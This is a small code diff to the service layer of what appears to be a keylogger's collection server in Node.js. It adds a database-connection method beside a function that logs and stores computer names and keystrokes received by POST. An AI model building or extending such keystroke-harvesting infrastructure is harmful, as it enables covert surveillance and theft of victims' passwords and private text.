@@ -1,6 +1,9 @@
 const keyloggerRepo = require("../repository/keyloggerRepo");
 
 const keyloggerService = {
+    connectDB:() => {
+        return keyloggerRepo.connectDB();
+    },
     saveKeystrokes: postReq => {
         console.log("POST REQUEST: ", postReq);
         return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes);
